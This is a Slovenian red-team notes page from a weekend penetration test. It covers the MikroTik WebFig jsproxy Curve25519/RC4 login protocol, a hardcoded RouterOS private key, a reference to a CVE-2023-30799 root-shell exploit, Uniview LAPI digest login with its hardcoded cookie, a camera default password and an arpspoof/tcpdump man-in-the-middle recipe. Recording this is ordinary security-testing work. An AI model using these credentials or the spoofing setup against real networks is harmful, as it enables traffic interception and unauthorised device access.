---
categories: security, technical, reference
created: 07/09/2026
rating: 10
tags: [2🌲, security, mikrotik, reverse-engineering, protocol]
related-to: "[[Red Team - Vikend Penetration Test]]"
---

# Red Team — Vikend Tehnični Detajli

Tehnične podrobnosti WebFig in Uniview protokolov za ponovno uporabo.

---

## WebFig jsproxy Auth Protocol

### Overview
MikroTik RouterOS uporablja `/jsproxy` endpoint za Winbox protokol preko HTTP. Dve verziji:
- **v1 (CHAP)**: DES + MD4 + SHA1 challenge-response (starejši ROS)
- **v2 (Curve25519 DH)**: Moderna izvedba (ROS 6.34+)

### v2 Handshake

```python
# 1. Empty POST za detekcijo
POST /jsproxy → 500 (v2) ali 200 + 24B (v1)

# 2. DH init: 8 null bytes + public key (BE format)
pub_LE = os.urandom(32)  # ali static key
pub_BE = bytes(reversed(pub_LE))
payload = b'\x00' * 8 + pub_BE  # 40 bytes
encoded = latin1_decode(payload).replace('\x00', '\u0100').encode('utf-8')
POST /jsproxy → 200 + session_id(4B BE) + server_pub(32B BE)

# 3. Shared secret
master_LE = X25519(private_LE, server_pub_LE)
master_BE = bytes(reversed(master_LE))

# 4. RC4 keys
tx = SHA1(master_BE + 0x00×40 + MAGIC_SEND + 0xf2×40)[:16]
rx = SHA1(master_BE + 0x00×40 + MAGIC_RECV + 0xf2×40)[:16]

MAGIC_SEND = "On the client side, this is the send key; on the server side, it is the receive key."
MAGIC_RECV = "On the client side, this is the receive key; on the server side, it is the send key."

# 5. RC4: preskoči 768 B, nato standardni RC4
RC4.set_key(tx)
RC4.skip(768)

# 6. M2 login packet
data = b'M2'
data += struct.pack('<I', 1)[:3] + bytes([0x21, len(username)]) + username
data += struct.pack('<I', 3)[:3] + bytes([0x21, len(password)]) + password

# 7. Encrypt + send
enc = RC4.encrypt(data) + RC4.encrypt(b'\x20' * 8)
packet = session_id(4B BE) + seq(4B BE) + enc
POST /jsproxy → 200 = success, 403 = wrong password, 500 = user not found
```

### FOISted Static Private Key
```python
PRIVATE_KEY = bytes([174, 119, 158, 240, 196, 104, 82, 173, 235, 48, 65, 51,
                     104, 30, 21, 241, 112, 192, 181, 215, 220, 133, 9, 206,
                     55, 88, 98, 134, 47, 198, 120, 65])
```
Ta static key je hardcoded v RouterOS firmware. FOISted ga uporablja namesto random generiranega.

### ROOT Shell (CVE-2023-30799)
Ko imamo admin dostop, FOISted exploit.py omogoča:
1. Privilege escalation: admin → super-admin
2. Arbitrary function call → root shell
3. Deluje na ROS 6.34 do 6.49.6 (naš 6.49.13/17 je patched)

---

## Uniview LAPI V1.0 Auth

### Login Flow
```
1. PUT /LAPI/V1.0/System/Security/Login
   Cookie: WebLoginHandle=10081124
   → 200 + WWW-Authenticate: Digest nonce="XXXX", realm="NVRDVR"

2. PUT /LAPI/V1.0/System/Security/Login
   Authorization: Digest username="admin", realm="NVRDVR", 
                 nonce="XXXX", uri="/LAPI/V1.0/System/Security/Login",
                 qop=auth, nc=00000001, cnonce="YYYY",
                 response="MD5_HA1:nonce:nc:cnonce:qop:MD5_HA2",
                 algorithm="MD5"
   Cookie: WebLoginHandle=10081124
   → 200 + {"Response":{"StatusCode":0}} = success

3. POST /LAPI/V1.0/System/Private/Redirect
   Body: {"Language":1, "Username":"admin", "Nonce":"XXXX", "ServerIp":"10.101.8.6"}
   → HTML management interface
```

### Digest MD5 Calculation
```python
ha1 = MD5(f"{username}:{realm}:{password}")      # MD5(username:realm:password)
ha2 = MD5(f"{method}:{uri}")                       # MD5(PUT:/LAPI/.../Login)
response = MD5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}")
```

### CGI Commands
```python
cmd=116  # get model info (bIsConfigured, szDeviceName, software version)
cmd=255  # config export (patched, returns 60031 = "not logged in")
cmd=200  # user list (requires auth)
cmd=10   # user login (returns 60006 = deprecated/removed)
```

### Hardcoded Values
- Cookie: `WebLoginHandle=10081124`
- Realm: `NVRDVR`
- CGI URL: `/cgi-bin/main-cgi`

---

## EWPE (Zhuhai) Camera

- OUI: F4:91:1E = Zhuhai EWPE Information Technology Inc
- SSID pattern: zadnjih 8 hex znakov MAC naslova
- Default password: `12345678`
- DHCP: 192.168.1.0/24, gateway 192.168.1.1
- Gateway ne odgovarja na noben protokol (ping, HTTP, nmap)
- Verjetno P2P kamera (iCSee/AllCam aplikacija)

---

## ARP Spoofing Setup

```bash
# Install
sudo apt install -y dsniff

# Enable IP forwarding
echo "PASSWORD" | sudo -S sysctl -w net.ipv4.ip_forward=1

# Start spoofing (both directions)
echo "PASSWORD" | sudo -S arpspoof -i wlp0s20f3 -t TARGET_IP GATEWAY_IP &
echo "PASSWORD" | sudo -S arpspoof -i wlp0s20f3 -t GATEWAY_IP TARGET_IP &

# Capture traffic
echo "PASSWORD" | sudo -S tcpdump -i wlp0s20f3 -A -s 0 -w /tmp/capture.pcap "host TARGET_IP"
```

---

## Povezave

- [[Red Team - Vikend Penetration Test]]
- [[Red Team Report]]
- FOISted: https://github.com/MarginResearch/FOISted
- Uniview exploit: https://www.exploit-db.com/exploits/42150
- CVE-2023-30799: https://nvd.nist.gov/vuln/detail/CVE-2023-30799
- VulnCheck blog: https://vulncheck.com/blog/mikrotik-foisted-revisited